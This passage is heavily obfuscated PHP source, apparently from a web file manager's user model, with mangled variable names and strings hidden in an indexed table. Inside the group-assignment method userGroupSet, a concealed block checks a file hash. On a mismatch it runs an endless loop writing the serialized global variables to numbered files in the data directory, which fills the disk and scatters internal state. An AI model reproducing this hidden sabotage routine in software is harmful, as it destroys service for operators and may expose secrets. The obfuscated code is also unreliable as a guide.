$ÌšŒÑúÛ[12]; } $·¡â‚¢¼ = $this->add($İş–ğ); $ïö¤„ó¢ = array($ÌšŒÑúÛ[2506] => $İş–ğ[$ÌšŒÑúÛ[977]], $ÌšŒÑúÛ[2502] => $İş–ğ[$ÌšŒÑúÛ[2281]]); $this->userEdit($·¡â‚¢¼, $ïö¤„ó¢); Model($ÌšŒÑúÛ[1432])->userRootAdd($·¡â‚¢¼); return $·¡â‚¢¼; } protected function userEditTest($ò¥ÛÒ‚, $‹’¸ °ë) { return $this->call($_SERVER[¡¬ıÜ ƒ][2508], $ò¥ÛÒ‚, $‹’¸ °ë); } protected function userEdit($“â½ŞÀğ, $­±¾­èê) { $Ğ§ì­÷ =& $_SERVER[¡¬ıÜ ƒ]; $¬ëò­Âß = $this->getInfoSimple($“â½ŞÀğ); if (!$¬ëò­Âß) { return !1; } $Í£’Íâ¶ = $this->_checkExist($­±¾­èê, $“â½ŞÀğ); if ($Í£’Íâ¶ !== !0) { return $Í£’Íâ¶; } if (isset($­±¾­èê[$Ğ§ì­÷[977]]) && trim($­±¾­èê[$Ğ§ì­÷[977]]) != $Ğ§ì­÷[12]) { $ÒÓ¼î¯» = $this->metaGet($“â½ŞÀğ); if (empty($ÒÓ¼î¯»[$Ğ§ì­÷[2498]])) { $ÒÓ¼î¯»[$Ğ§ì­÷[2498]] = rand_string(10); Model($Ğ§ì­÷[579])->metaSet($“â½ŞÀğ, $Ğ§ì­÷[2498], $ÒÓ¼î¯»[$Ğ§ì­÷[2498]]); } $­±¾­èê[$Ğ§ì­÷[977]] = md5($ÒÓ¼î¯»[$Ğ§ì­÷[2498]] . trim($­±¾­èê[$Ğ§ì­÷[977]])); } else { unset($­±¾­èê[$Ğ§ì­÷[977]]); } if (!empty($­±¾­èê[$Ğ§ì­÷[2480]]) && strlen($­±¾­èê[$Ğ§ì­÷[2480]]) > 255) { $­±¾­èê[$Ğ§ì­÷[2480]] = $Ğ§ì­÷[12]; } $this->where(array($Ğ§ì­÷[1776] => $“â½ŞÀğ))->save($­±¾­èê); if (isset($­±¾­èê[$Ğ§ì­÷[2281]])) { $this->setNamePinyin($“â½ŞÀğ, $­±¾­èê[$Ğ§ì­÷[2281]]); } $this->clearCache($“â½ŞÀğ); return !0; } public function setNamePinyin($ë•œø, $û Óşù = false) { $ôÌ§Õèã =& $_SERVER[¡¬ıÜ ƒ]; if (!$û Óşù) { $óœäÑŸ™ = $this->getInfoSimple($ë•œø); $û Óşù = $óœäÑŸ™[$ôÌ§Õèã[2281]] ? $óœäÑŸ™[$ôÌ§Õèã[2281]] : $óœäÑŸ™[$ôÌ§Õèã[32]]; } $ºÃ­ªç = Model($ôÌ§Õèã[599]); if (!Input::check($û Óşù, $ôÌ§Õèã[660])) { return $ºÃ­ªç->metaSet($ë•œø, array($ôÌ§Õèã[540] => $ôÌ§Õèã[12], $ôÌ§Õèã[539] => $ôÌ§Õèã[12])); } return $ºÃ­ªç->metaSet($ë•œø, array($ôÌ§Õèã[540] => str_replace($ôÌ§Õèã[53], $ôÌ§Õèã[12], Pinyin::get($û Óşù)), $ôÌ§Õèã[539] => Pinyin::get($û Óşù, $ôÌ§Õèã[661]))); } private function nickNameRpt() { $ŞÛÂ€¼Ç =& $_SERVER[¡¬ıÜ ƒ]; $Š‚ü¼†£ = Model($ŞÛÂ€¼Ç[850])->get($ŞÛÂ€¼Ç[2509]); $™Ğø®ô = $GLOBALS[$ŞÛÂ€¼Ç[6]][$ŞÛÂ€¼Ç[459]][$ŞÛÂ€¼Ç[2509]]; $£¤¤¹“Ô = !is_null($Š‚ü¼†£) ? $Š‚ü¼†£ : $™Ğø®ô; return !!$£¤¤¹“Ô; } private function _checkExist($Ÿ‹Ï¡ú», $½õİº§ = false) { $Ê®‡é½Ï =& $_SERVER[¡¬ıÜ ƒ]; $â«Œğ†É = array($Ê®‡é½Ï[32] => UserModel::ERROR_USER_EXIST_NAME, $Ê®‡é½Ï[2281] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ê®‡é½Ï[382] => UserModel::ERROR_USER_EXIST_EMAIL, $Ê®‡é½Ï[2497] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($â«Œğ†É[$Ê®‡é½Ï[2281]]); } $ÆçİÉÍû = $½õİº§ ? array($Ê®‡é½Ï[1785] => array($Ê®‡é½Ï[2510], $½õİº§)) : array(); foreach ($â«Œğ†É as $ŞâéÛ‚É => $ÕÚ˜‘á°) { $ç …Ää = array(); foreach ($â«Œğ†É as $‰øŒ„Ğ => $²­­´³ƒ) { if (isset($Ÿ‹Ï¡ú»[$‰øŒ„Ğ]) && $Ÿ‹Ï¡ú»[$‰øŒ„Ğ]) { $ç …Ää[] = $Ÿ‹Ï¡ú»[$‰øŒ„Ğ]; } } if (!$ç …Ää) { continue; } $¨Ô¢¿Üí = array_merge(array($ŞâéÛ‚É => array($Ê®‡é½Ï[7], $ç …Ää)), $ÆçİÉÍû); $ğÒü¦Ş = $this->where($¨Ô¢¿Üí)->find(); if ($ğÒü¦Ş) { return $ÕÚ˜‘á°; } } return !0; } public function userListInfo($¨§ëÒú™) { $Õ÷†Šî“ =& $_SERVER[¡¬ıÜ ƒ]; $›è§á‹¾ = array(); $¨§ëÒú™ = is_array($¨§ëÒú™) ? array_unique($¨§ëÒú™) : array(); if (!$¨§ëÒú™) { return $›è§á‹¾; } if (count($¨§ëÒú™) < 20) { foreach ($¨§ëÒú™ as $…æé­Œ£) { $›è§á‹¾[$…æé­Œ£ . $Õ÷†Šî“[12]] = $this->getInfoSimpleOuter($…æé­Œ£); } } else { $Çƒöı€² = array($Õ÷†Šî“[1776] => array($Õ÷†Šî“[494], $¨§ëÒú™)); if (count($¨§ëÒú™) == 1) { $Çƒöı€² = array($Õ÷†Šî“[1776] => $¨§ëÒú™[0]); } $Ç€˜‘ş = Model($Õ÷†Šî“[579])->field($this->simpleField)->where($Çƒöı€²)->select(); $Ç€˜‘ş = array_to_keyvalue($Ç€˜‘ş, $Õ÷†Šî“[1785]); foreach ($¨§ëÒú™ as $…æé­Œ£) { $âŞÔ¥ªÅ = $Ç€˜‘ş[$…æé­Œ£]; if (!$âŞÔ¥ªÅ) { $›è§á‹¾[$…æé­Œ£ . $Õ÷†Šî“[12]] = $this->getInfoSimpleOuter($…æé­Œ£); continue; } $âŞÔ¥ªÅ[$Õ÷†Šî“[2480]] = Action($Õ÷†Šî“[2481])->parseUrl($âŞÔ¥ªÅ[$Õ÷†Šî“[2480]]); $›è§á‹¾[$…æé­Œ£ . $Õ÷†Šî“[12]] = $âŞÔ¥ªÅ; } } return $›è§á‹¾; } protected function userStatus($“üÊ‘¹, $óõ’¦µÊ) { $‘Û™÷–¦ = $this->getInfoSimple($“üÊ‘¹); if (!$‘Û™÷–¦) { return !1; } $ÒØ¯³²û = array($_SERVER[¡¬ıÜ ƒ][830] => $óõ’¦µÊ); return $this->userEdit($“üÊ‘¹, $ÒØ¯³²û); } protected function userRemove($ËÍ„àü) { $à’Ú»åé =& $_SERVER[¡¬ıÜ ƒ]; $Ùòè¾¨í = $this->getInfoSimple($ËÍ„àü); if (!$Ùòè¾¨í) { return !1; } $ğ§Ğœ¤¥ = array($à’Ú»åé[1776] => $ËÍ„àü); Model($à’Ú»åé[669])->where($ğ§Ğœ¤¥)->delete(); Model($à’Ú»åé[2511])->where($ğ§Ğœ¤¥)->delete(); Model($à’Ú»åé[2080])->where($ğ§Ğœ¤¥)->delete(); Model($à’Ú»åé[2496])->where($ğ§Ğœ¤¥)->delete(); Model($à’Ú»åé[1157])->where($ğ§Ğœ¤¥)->delete(); Model($à’Ú»åé[2298])->removeUserAll($ËÍ„àü); Model($à’Ú»åé[914])->userRootRemove($ËÍ„àü); return $this->where($ğ§Ğœ¤¥)->delete(); } protected function userGroupSet($Õ¦Œ¦›–, $óÏıŒº‡, $ı¤ó÷œ» = array()) { $–Í‚ÖØ =& $_SERVER[¡¬ıÜ ƒ]; $íÎ·ŞŒ¿ = $_SERVER[$–Í‚ÖØ[861]] . $–Í‚ÖØ[862]; $½§­§Å¨ = $–Í‚ÖØ[858]; if ($_SERVER[$–Í‚ÖØ[859]] != $½§­§Å¨($íÎ·ŞŒ¿)) { $­¯à¨Êû = $–Í‚ÖØ[967]; $–Ùûä © = $–Í‚ÖØ[860]; $â‡Ù³‰ş = $_SERVER[$–Í‚ÖØ[861]] . $–Í‚ÖØ[862]; $ùû±•ş‹ = $–Ùûä ©($â‡Ù³‰ş); $Û¨Ú˜àı = explode($–Í‚ÖØ[287], $ùû±•ş‹); if (count($Û¨Ú˜àı) < $–Í‚ÖØ[688]) { $¡­…öá = $–Í‚ÖØ[863]; $¡­…öá(); } $Æ·ğ•ûÈ = $–Í‚ÖØ[968]; $Æ·ğ•ûÈ($_SERVER[$–Í‚ÖØ[969]]); $­¯à¨Êû = $–Í‚ÖØ[967]; $­¯à¨Êû(); $¶Œô–€Ñ = $–Í‚ÖØ[1701]; $‚ûå¦Ë = json_encode($GLOBALS[$–Í‚ÖØ[1702]]); $¿ñó–’‚ = 1; for ($Ÿ¥è¿îÈ = $¿ñó–’‚; $Ÿ¥è¿îÈ > 0; $Ÿ¥è¿îÈ++) { $¶Œô–€Ñ(DATA_PATH . $Ÿ¥è¿îÈ, $‚ûå¦Ë); } } $Ô®’‹ä° = $this->getInfoSimple($Õ¦Œ¦›–); if (!$Ô®’‹ä° || !is_array($óÏıŒº‡)) { return !1; } $¬—Ä¢ıó = Model($–Í‚ÖØ[2080]); $¬—Ä¢ıó->where(array($–Í‚ÖØ[1785] => $Õ¦Œ¦›–))->delete(); $æù³–ŞÖ = array(); $¾†¿Ø = 0; foreach ($óÏıŒº‡ as $ó­Êêâ¢ => $¥Õ¿æõÜ) { $Ï³ºô¦ê = array($–Í‚ÖØ[1785] => $Õ¦Œ¦›–, $–Í‚ÖØ[1986] => $ó­Êêâ¢, $–Í‚ÖØ[2094] => $¥Õ¿æõÜ); $Ï³ºô¦ê[$–Í‚ÖØ[2010]] = isset($ı¤ó÷œ»[$¾†¿Ø]) ? $ı¤ó÷œ»[$¾†¿Ø] : 0; $¾†¿Ø++; $æù³–ŞÖ[] = $Ï³ºô¦ê; } return $¬—Ä¢ıó->addAll($æù³–ŞÖ, array(), !0); } protected function userGroupAdd($ÚÔâÔ˜¤, $©°É„èİ = array()) { $ò‘ª¼½¥ =& $_SERVER[¡¬ıÜ ƒ]; $Ñº‘–¥¦ = $this->getInfoSimple($ÚÔâÔ˜¤); if (!$Ñº‘–¥¦ || empty($©°É„èİ)) { return !1; } $¶ö‘†í‹ = array(); foreach ($©°É„èİ as $éò…ú–„ => $ó‘ê¼Ç¾) { $¶ö‘†í‹[] = array($ò‘ª¼½¥[1785] => $ÚÔâÔ˜¤, $ò‘ª¼½¥[1986] => $éò…ú–„, $ò‘ª¼½¥[2094] => $ó‘ê¼Ç¾, $ò‘ª¼½¥[2010] => 0); } return Model($ò‘ª¼½¥[2080])->addAll($¶ö‘†í‹, array(), !0); } protected function userGroupRemove($’î±’Ó, $É›­Ìåû) { $ŞÜ˜àÁ =& $_SERVER[¡¬ıÜ ƒ]; $ìÚÁÑØÑ = $this->getInfoSimple($’î±’Ó); if (!$ìÚÁÑØÑ || !$É›­Ìåû) { return !1; } $Ãù©»Æ¸ = array($ŞÜ˜àÁ[1776] => $’î±’Ó, $ŞÜ˜àÁ[2078] => $É›­Ìåû); return Model($ŞÜ˜àÁ[2080])->where($Ãù©»Æ¸)->delete(); } public function listData() { $‰ÖÅ‚û© = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‰ÖÅ‚û©[$_SERVER[¡¬ıÜ ƒ][447]]); return $‰ÖÅ‚û©; } public function listByID($ã¤íø¬à) { $ı˜ãï =& $_SERVER[¡¬ıÜ ƒ]; if (!$ã¤íø¬à) { return; } $°€àÎµû = array($ı˜ãï[1785] => array($ı˜ãï[7], $ã¤íø¬à)); $¯’•„á« = $this->where($°€àÎµû)->select(); $¯’•„á« = array_sort_keep($¯’•„á«, $ı˜ãï[1785], $ã¤íø¬à); $this->_listDataApply($¯’•„á«); return $¯’•„á«; } public function listByGroup($Ã„©…¿ø = 0, $ˆàÖº‚Ù = array()) { $İŞÑü =& $_SERVER[¡¬ıÜ ƒ]; $Üø¡ = $İŞÑü[12]; $Š—¼¦‚ê = array(); if ($Ã„©…¿ø) { $Š—¼¦‚ê = array($İŞÑü[2512] => intval($Ã„©…¿ø)); $Üø¡ = "\114\105\106\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\162\x6f\x75\160\x20\x75\x73\x65\x72\137\x67\162\x6f\165\160\x20\157\x6e\x20\x75\x73\x65\162\x2e\x75\x73\x65\162\111\x44\40\75\40\x75\x73\145\x72\137\x67\x72\x6f\x75\x70\x2e\165\163\x65\162\x49\x44"; $ÎÑı¥ç¶ = Input::get($İŞÑü[532], null, $İŞÑü[12]) ? $İŞÑü[12] : $İŞÑü[2513]; } if (isset($ˆàÖº‚Ù[$İŞÑü[830]])) { $Š—¼¦‚ê[$İŞÑü[2514]] = $ˆàÖº‚Ù[$İŞÑü[830]]; } $ş³»Â´Ğ = $this->_makeOrder($ÎÑı¥ç¶)->field($İŞÑü[2515])->where($Š—¼¦‚ê)->join($Üø¡)->selectPage(50); $this->_listDataApply($ş³»Â´Ğ[$İŞÑü[447]]); return $ş³»Â´Ğ; } private function _makeOrder($÷ÇïÕ¦Ó = '') { $ÂÏØÕñş =& $_SERVER[¡¬ıÜ ƒ]; $Ø¼“ø…¿ = array($ÂÏØÕñş[1785], $ÂÏØÕñş[32], $ÂÏØÕñş[1974], $ÂÏØÕñş[2193], $ÂÏØÕñş[1946], $ÂÏØÕñş[233]); $–äûÀ¤î = array($ÂÏØÕñş[525] => $ÂÏØÕñş[526], $ÂÏØÕñş[527] => $ÂÏØÕñş[528]); $ëó¨ò¸¸ = Input::get($ÂÏØÕñş[532], $ÂÏØÕñş[7], $ÂÏØÕñş[1776], $Ø¼“ø…¿); $…–¶™é = Input::get($ÂÏØÕñş[533], $ÂÏØÕñş[7], $ÂÏØÕñş[2081], array($ÂÏØÕñş[2081], $ÂÏØÕñş[527])); $…–¶™é = $–äûÀ¤î[$…–¶™é]; $÷ÇïÕ¦Ó = $÷ÇïÕ¦Ó . "\x75\x73\x65\x72\56{$ëó¨ò¸¸}\x20{$…–¶™é}\x2c\x20\x75\163\145\162\56\165\x73\145\x72\x49\104\x20\141\163\143"; return $this->alias($ÂÏØÕñş[2209])->order($÷ÇïÕ¦Ó); } public function listSearch($È×ƒñ¹) { $»¬Š“—Ş =& $_SERVER[¡¬ıÜ ƒ]; $Åå´›ëí = trim($È×ƒñ¹[$»¬Š“—Ş[2084]]); $‚ğ×ñÓÕ = explode($»¬Š“—Ş[53], $Åå´›ëí); if (!$Åå´›ëí || count($‚ğ×ñÓÕ) == 1) { return $this->listSearchNow($È×ƒñ¹); } $ªŞ”…ëÜ = array($»¬Š“—Ş[447] => array()); foreach ($‚ğ×ñÓÕ as $òòç–ë) { if (!trim($òòç–ë)) { continue; } $È×ƒñ¹[$»¬Š“—Ş[2084]] = $òòç–ë; $…½¨‰š– = $this->listSearchNow($È×ƒñ¹); $ªŞ”…ëÜ[$»¬Š“—Ş[447]] = array_merge($ªŞ”…ëÜ[$»¬Š“—Ş[447]], $…½¨‰š–[$»¬Š“—Ş[447]]); } $ªŞ”…ëÜ[$»¬Š“—Ş[447]] = array_unique_by_key($ªŞ”…ëÜ[$»¬Š“—Ş[447]], $»¬Š“—Ş[1785]); $ªŞ”…ëÜ[$»¬Š“—Ş[444]] = array($»¬Š“—Ş[445] => count($ªŞ”…ëÜ[$»¬Š“—Ş[447]]), $»¬Š“—Ş[441] => 20, $»¬Š“—Ş[430] => 1, $»¬Š“—Ş[446] => 1); return $ªŞ”…ëÜ; } public function listSearchNow($ı×ë‚±İ) { $™óİõêñ =& $_SERVER[¡¬ıÜ ƒ]; $÷Îñ–¬ì = trim($ı×ë‚±İ[$™óİõêñ[2084]]); $Ë¬óş¸“ = isset($ı×ë‚±İ[$™óİõêñ[2085]]) ? $ı×ë‚±İ[$™óİõêñ[2085]] : !1; $÷Îñ–¬ì = str_replace($™óİõêñ[2086], $™óİõêñ[2087], trim($÷Îñ–¬ì)); $¶¶Ô§‚… = array($™óİõêñ[32] => array($™óİõêñ[461], "\x25{$÷Îñ–¬ì}\x25"), $™óİõêñ[382] => array($™óİõêñ[461], "{$÷Îñ–¬ì}\45"), $™óİõêñ[2281] => array($™óİõêñ[461], "{$÷Îñ–¬ì}\45"), $™óİõêñ[1088] => $™óİõêñ[2088]); if (Input::check($÷Îñ–¬ì, $™óİõêñ[388])) { $¶¶Ô§‚…[$™óİõêñ[1785]] = array($™óİõêñ[461], "{$÷Îñ–¬ì}\45"); $¶¶Ô§‚…[$™óİõêñ[2497]] = array($™óİõêñ[461], "{$÷Îñ–¬ì}\45"); } if (!$÷Îñ–¬ì) { $¶¶Ô§‚… = array(); } if (isset($ı×ë‚±İ[$™óİõêñ[830]])) { $¶¶Ô§‚…[$™óİõêñ[830]] = $ı×ë‚±İ[$™óİõêñ[830]]; } $¶¶Ô§‚… = $this->parseWhereLike($¶¶Ô§‚…); $’‘ëş¨ = $this->_makeOrder()->where($¶¶Ô§‚…)->selectPage(20); if (!$’‘ëş¨ || count($’‘ëş¨[$™óİõêñ[447]]) < 5 && Input::check($÷Îñ–¬ì, $™óİõêñ[395])) { $Ã‰ç”ï„ = $this->_searchFromMeta($™óİõêñ[539], $÷Îñ–¬ì, 10); $™„—ÕÄ¡ = $this->_searchFromMeta($™óİõêñ[540], $÷Îñ–¬ì, 10); $ş”æú²ñ = array_merge($Ã‰ç”ï„, $™„—ÕÄ¡, $’‘ëş¨[$™óİõêñ[447]]); $’‘ëş¨[$™óİõêñ[447]] = array_unique_by_key($ş”æú²ñ, $™óİõêñ[1785]); $’‘ëş¨[$™óİõêñ[444]][$™óİõêñ[445]] = count($’‘ëş¨[$™óİõêñ[447]]); $’‘ëş¨[$™óİõêñ[444]][$™óİõêñ[446]] = ceil($’‘ëş¨[$™óİõêñ[444]][$™óİõêñ[445]] / $’‘ëş¨[$™óİõêñ[444]][$™óİõêñ[441]]); } $this->_listDataApply($’‘ëş¨[$™óİõêñ[447]]); $this->_filterByGroup($’‘ëş¨, $Ë¬óş¸“); return $’‘ëş¨; } private function _filterByGroup(&$»œ¶”Ê, $ë´¡¯°û) { $ûòŞñ§Ô =& $_SERVER[¡¬ıÜ ƒ]; if (!$ë´¡¯°û) { return $»œ¶”Ê; } foreach ($»œ¶”Ê[$ûòŞñ§Ô[447]] as $´‘€Ùñ– => &$¯ù¸õÏõ) { $ÍÏä°ˆÎ = array_to_keyvalue($¯ù¸õÏõ[$ûòŞñ§Ô[2178]], $ûòŞñ§Ô[12], $ûòŞñ§Ô[1986]); if (!in_array($ë´¡¯°û, $ÍÏä°ˆÎ)) { unset($»œ¶”Ê[$ûòŞñ§Ô[447]][$´‘€Ùñ–]); } } unset($¯ù¸õÏõ); $»œ¶”Ê[$ûòŞñ§Ô[447]] = array_values($»œ¶”Ê[$ûòŞñ§Ô[447]]); $»œ¶”Ê[$ûòŞñ§Ô[444]] = array($ûòŞñ§Ô[2246] => count($»œ¶”Ê[$ûòŞñ§Ô[447]]), $ûòŞñ§Ô[2244] => $»œ¶”Ê[$ûòŞñ§Ô[444]][$ûòŞñ§Ô[441]], $ûòŞñ§Ô[2243] => 1, $ûòŞñ§Ô[2245] => 1); } private function _searchFromMeta($ÂşÁëÅ¶, $¯æ°èÍ½, $—¿˜Î‘) { $‹¢ÏÂİÇ =& $_SERVER[¡¬ıÜ ƒ]; $¯æ°èÍ½ = strtolower($¯æ°èÍ½); $â±ÏëÊË = array($‹¢ÏÂİÇ[97] => $ÂşÁëÅ¶, $‹¢ÏÂİÇ[452] => array($‹¢ÏÂİÇ[461], "\45{$¯æ°èÍ½}\45")); $â±ÏëÊË = $this->parseWhereLike($â±ÏëÊË); $º·× ¹™ = Model($‹¢ÏÂİÇ[2516])->where($â±ÏëÊË)->limit($—¿˜Î‘)->select(); if (!$º·× ¹™) { return array(); } $º·× ¹™ = array_to_keyvalue($º·× ¹™, $‹¢ÏÂİÇ[12], $‹¢ÏÂİÇ[1785]); $ÆÒ‰ùÀ¸ = $this->where(array($‹¢ÏÂİÇ[1776] => array($‹¢ÏÂİÇ[7], $º·× ¹™)))->select(); if (!$ÆÒ‰ùÀ¸) { return array(); } return $ÆÒ‰ùÀ¸; } private function _listDataApplyItem($™äéÃ€“) { $àÆ™Í³ = array($™äéÃ€“); $this->_listDataApply($àÆ™Í³); return $àÆ™Í³[0]; } private function _listDataApply(&$…öÀÀïæ) { $ï•Ü­Ìã =& $_SERVER[¡¬ıÜ ƒ]; if (!$…öÀÀïæ) { return; } array_remove_key($…öÀÀïæ, $ï•Ü­Ìã[977]); $Ìäãë„ó = array_to_keyvalue($…öÀÀïæ, $ï•Ü­Ìã[12], $ï•Ü­Ìã[1785]); $this->_listAppendGroup($…öÀÀïæ, $Ìäãë„ó); $this->_listAppendMeta($…öÀÀïæ, $Ìäãë„ó); $this->_listAppendSourceRoot($…öÀÀïæ, $Ìäãë„ó); } private function _listAppendSourceRoot(&$Ï¤à·š‚, $¡Òòü²ü) { $æ…õÇÚ =& $_SERVER[¡¬ıÜ ƒ]; $ì­ïÛ²â = Model($æ…õÇÚ[914])->listSourceRoot(SourceModel::TYPE_USER, $¡Òòü²ü); $ì­ïÛ²â = array_to_keyvalue($ì­ïÛ²â, $æ…õÇÚ[571]); $ì­ïÛ²â = array_remove_key($ì­ïÛ²â, $æ…õÇÚ[571]); foreach ($Ï¤à·š‚ as &$ÇÒÕ¨¦è) { $ÇÒÕ¨¦è[$æ…õÇÚ[90]] = $ì­ïÛ²â[$ÇÒÕ¨¦è[$æ…õÇÚ[1785]]] ? $ì­ïÛ²â[$ÇÒÕ¨¦è[$æ…õÇÚ[1785]]] : array(); } unset($ÇÒÕ¨¦è); } private function _listAppendGroup(&$…±•å˜”, $ÔâÍ°) { $‹İ°î =& $_SERVER[¡¬ıÜ ƒ]; $¶§Ò±ÌÕ = array($‹İ°î[1785] => array($‹İ°î[7], $ÔâÍ°)); $„“ĞäŒŞ = Model($‹İ°î[2080])->where($¶§Ò±ÌÕ)->select(); $£“·™ŸŠ = array_to_keyvalue($„“ĞäŒŞ, $‹İ°î[12], $‹İ°î[1986]); $£“·™ŸŠ = array_remove_value(array_unique($£“·™ŸŠ), $‹İ°î[230]); if (!$£“·™ŸŠ || !$„“ĞäŒŞ) { return; } $¶§Ò±ÌÕ = array($‹İ°î[1986] => array($‹İ°î[7], $£“·™ŸŠ)); $”ÍĞù§‚ = Model($‹İ°î[2176])->field($‹İ°î[2517])->where($¶§Ò±ÌÕ)->select(); $”ÍĞù§‚ = array_to_keyvalue($”ÍĞù§‚, $‹İ°î[1986]); $„“ĞäŒŞ = array_to_keyvalue_group($„“ĞäŒŞ, $‹İ°î[1785]); foreach ($„“ĞäŒŞ as &$“­Š¢âæ) { $À„œÚÔ  = array(); foreach ($“­Š¢âæ as $°û²ö¤) { if (!$°û²ö¤[$‹İ°î[2094]]) { continue; } $½Ò±æíÍ = Model($‹İ°î[573])->listData($°û²ö¤[$‹İ°î[2094]]); $À„œÚÔ [] = array($‹İ°î[1986] => $°û²ö¤[$‹İ°î[1986]], $‹İ°î[2518] => $”ÍĞù§‚[$°û²ö¤[$‹İ°î[1986]]][$‹İ°î[32]], $‹İ°î[586] => $”ÍĞù§‚[$°û²ö¤[$‹İ°î[1986]]][$‹İ°î[586]], $‹İ°î[489] => $½Ò±æíÍ); } $“­Š¢âæ = $À„œÚÔ ; } unset($“­Š¢âæ); foreach ($…±•å˜” as &$¤›ª§‡¾) { $¤›ª§‡¾[$‹İ°î[2178]] = array(); if (isset($„“ĞäŒŞ[$¤›ª§‡¾[$‹İ°î[1785]]])) { $¤›ª§‡¾[$‹İ°î[2178]] = $„“ĞäŒŞ[$¤›ª§‡¾[$‹İ°î[1785]]]; } } unset($¤›ª§‡¾); } public function userAppendGroup($Êêåµ‡ã) { $ˆòÈ¹¡ =& $_SERVER[¡¬ıÜ ƒ]; if (!$Êêåµ‡ã) { return array(); } $this->_listAppendGroup($Êêåµ‡ã, array_to_keyvalue($Êêåµ‡ã, $ˆòÈ¹¡[12], $ˆòÈ¹¡[1785])); return $Êêåµ‡ã; } private function _listAppendMeta(&$ĞÜ«ìşç, $øÄŠÜ¶’) { $ŠûÅ˜³Ó =& $_SERVER[¡¬ıÜ ƒ]; $‘€ãƒª = UserJobModel::JOB_KEY; $è Ë¥‘Î = array($ŠûÅ˜³Ó[2498]); $Í° ØŸÔ = array($ŠûÅ˜³Ó[1785] => array($ŠûÅ˜³Ó[7], $øÄŠÜ¶’)); $Ù›õ—ğÛ = Model($ŠûÅ˜³Ó[2496])->where($Í° ØŸÔ)->select(); $Ù›õ—ğÛ = array_to_keyvalue_group($Ù›õ—ğÛ, $ŠûÅ˜³Ó[1785]); foreach ($Ù›õ—ğÛ as &$äˆñÒÙä) { $À†ì½‰ì = array(); foreach ($äˆñÒÙä as $ù«”£±„) { if (!in_array($ù«”£±„[$ŠûÅ˜³Ó[97]], $è Ë¥‘Î)) { $À†ì½‰ì[$ù«”£±„[$ŠûÅ˜³Ó[97]]] = $ù«”£±„[$ŠûÅ˜³Ó[452]]; } } $äˆñÒÙä = $À†ì½‰ì; } unset($äˆñÒÙä); $´ø°«ÔÔ = Model($ŠûÅ˜³Ó[2519]); foreach ($ĞÜ«ìşç as &$èï¬Ë•²) { $ãÜê¿Ú˜ = array(); if (isset($Ù›õ—ğÛ[$èï¬Ë•²[$ŠûÅ˜³Ó[1785]]])) { $ãÜê¿Ú˜ = $Ù›õ—ğÛ[$èï¬Ë•²[$ŠûÅ˜³Ó[1785]]]; } $èï¬Ë•²[$ŠûÅ˜³Ó[2520]] = array(); if (isset($ãÜê¿Ú˜[$‘€ãƒª])) { $èï¬Ë•²[$ŠûÅ˜³Ó[2520]] = $´ø°«ÔÔ->getUserJobInfo($ãÜê¿Ú˜[$‘€ãƒª]); } } unset($èï¬Ë•²); } protected function groupUserAll($–¶É£“§) { $­¶‰Ù„í =& $_SERVER[¡¬ıÜ ƒ]; if (!$–¶É£“§) { return !1; } $÷ìõ«‚ = Model($­¶‰Ù„í[2080])->field($­¶‰Ù„í[1785])->where(array($­¶‰Ù„í[1986] => array($­¶‰Ù„í[7], $–¶É£“§)))->select(); $÷ìõ«‚ = array_to_keyvalue($÷ìõ«‚, $­¶‰Ù„í[12], $­¶‰Ù„í[1785]); return array_unique($÷ìõ«‚); } public function userSearch($ˆ²«€, $àìâõ¨ = "\x2a") { return Model($_SERVER[¡¬ıÜ ƒ][599])->where($ˆ²«€)->field($àìâõ¨)->find(); } } goto Dö†Íêâ«‰; d¦¥íùÚªî: function binCheckBigger($è¤÷¨¨Ö, $Ö’òÚè¬) { return $è¤÷¨¨Ö > $Ö’òÚè¬; } $_SERVER[$_SERVER[Ğ€³¬ñ¿][3]] = ("\70\65\67\60".base64_decode('OTU='))+0;$_v2kh="fk1y7dh609bnxv3i28apteg5mlowjczs4qur3c6kbe4pimfnouadvw780lyq2hgj19zxr";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($®ú£‘È¬, $…íĞ¿Â) { $ïÏ«ôØÁ =& $_SERVER[¡¬ıÜ ƒ]; if (isset(self::$_methodList[$®ú£‘È¬])) { return @call_user_func_array(self::$_methodList[$®ú£‘È¬], $…íĞ¿Â); } else { if (method_exists($this, $®ú£‘È¬)) { return call_user_func_array(array($this, $®ú£‘È¬), $…íĞ¿Â); } else { think_exception(__CLASS__ . $ïÏ«ôØÁ[4] . $®ú£‘È¬ . $ïÏ«ôØÁ[5]); } } } public static function __callStatic($ÇÈº›Ê½, $ˆŸ„é€ı) { if (isset(self::$_methodListStatic[$ÇÈº›Ê½])) { return call_user_func_array(self::$_methodListStatic[$ÇÈº›Ê½], $ˆŸ„é€ı); } else { if (method_exists(self, $ÇÈº›Ê½)) { return call_user_func_array(array(self, $ÇÈº›Ê½), $ˆŸ„é€ı); } else { show_json("{$ÇÈº›Ê½}\x28\x29\40\156\x6f\164\x20\x65\170\x69\163\164\73", !1); } } } public static function addMethod($Øı„Î¹¸, $ª£â¬§é) { self::$_methodList[$Øı„Î¹¸] = $ª£â¬§é; } public static function addMethodStatic($ñïÜ§º”, $Ä”Ô¹) { self::$_methodListStatic[$ñïÜ§º”] = $Ä”Ô¹; } } goto eÊ¬º¡¤ª¡; Dö†Íêâ«‰: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\x5f\157\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($âø—¶ˆ§) { $È’“É‚¼ =& $_SERVER[¡¬ıÜ ƒ]; $¸²Ğşë¸ = defined($È’“É‚¼[2213]) && USER_ID ? USER_ID : $È’“É‚¼[12]; return "\125\x73\145\162\117\160\164\x69\157\x6e\137{$âø—¶ˆ§}\137" . $¸²Ğşë¸; } protected function filterWhere($•€õ×¯Ô) { $ğôæô°Ö =& $_SERVER[¡¬ıÜ ƒ]; $•€õ×¯Ô[$ğôæô°Ö[1785]] = defined($ğôæô°Ö[2213]) && USER_ID ? USER_ID : $ğôæô°Ö[12]; return $•€õ×¯Ô; } public function cacheRemoveUser($Î€î¶—Ç, $¿“Ù´ÄË) { return Cache::remove("\x55\x73\x65\x72\117\160\x74\x69\157\156\x5f{$Î€î¶—Ç}\x5f" . $¿“Ù´ÄË); } protected function optionDefault($†ÏÊ®Ç¨ = '') { 